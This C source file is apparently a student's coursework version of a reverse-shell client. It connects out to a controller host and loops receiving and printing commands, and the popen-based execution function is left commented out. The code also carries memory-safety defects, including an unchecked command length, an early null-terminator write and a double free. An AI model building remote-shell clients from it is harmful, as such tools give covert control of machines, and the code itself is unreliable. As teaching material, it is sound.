#include "reverse-shell.h"
#include "client.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <stdbool.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>

bool receive_command(int server_socket, client_command *cmd);
int create_client_socket(const char *server_host, int server_port);

int create_client_socket(const char *server_host, int server_port) {
    printf("Creating client socket at: %s:%d\r\n", server_host, server_port);

    int client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if(client_socket < 0) {
        perror("Error opening client socket");
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in socket_address = {0};
    socket_address.sin_family = AF_INET;
    socket_address.sin_port = htons(server_port);
    socket_address.sin_addr.s_addr = inet_addr(server_host);

    if(connect(client_socket, (struct sockaddr *) &socket_address, 
        sizeof(socket_address)) < 0) {
        perror("Error connecting client socket");
        exit(EXIT_FAILURE);
    }

    client_command *cmd = malloc(sizeof(client_command));

    while(true) {
        
        char buf;
        // Check if the server connection has been closed by pining the server.
        if (recv(client_socket, &buf, sizeof(buf), MSG_PEEK) == 0) {
            // The server has closed the connection, exit the loop.
            break;
        }

        receive_command(client_socket, cmd);
        printf("Received this command: %s\r\n", cmd->command_string);
    }

    free(cmd);
    cmd = NULL;

    if(close(client_socket) < 0) {
        perror("Error closing socket");
        exit(EXIT_FAILURE);
    }

    printf("Client shutdown successfully.\r\n");
}

bool receive_command(int server_socket, client_command *cmd) {
    if(recv(server_socket, &cmd->header, sizeof(cmd->header), 0) == -1) {
        perror("First"); 
        return false;
    }

    cmd->command_string[cmd->header.command_length] = '\0';
    if(recv(server_socket, cmd->command_string, cmd->header.command_length, 0) == -1) {
        perror("Second");
        free(cmd);
        return false;
    }

    // Check if connection has been closed.
    if (cmd->header.command_length == 0) {
        return false;
    }

    return true;
}

// This function is copied from the link below(provided by lecturer), with a few modifictions:
// http://www.eastwill.no/pg3401/eksamen_v23_oppgave5_exec.c
// char* ExecuteCommand(const char *pcszCommand) {
//    FILE* fp = NULL;
//    char *pszReturnString = malloc(MAX_BUFFER_SIZE);
//    if (pszReturnString == NULL) return NULL;
//    memset(pszReturnString, 0, MAX_BUFFER_SIZE);

//    fp = popen(pcszCommand, "r");
//    if (fp == NULL) {
//       sprintf(pszReturnString, "Error: Failed to execute command");
//    }
//    else {
//       if (fgets(pszReturnString, MAX_BUFFER_SIZE - 1, fp) == NULL) {
//          sprintf(pszReturnString, "Error: Failed to read output");
//       }
//       pclose(fp);
//    }
//    return pszReturnString;
// }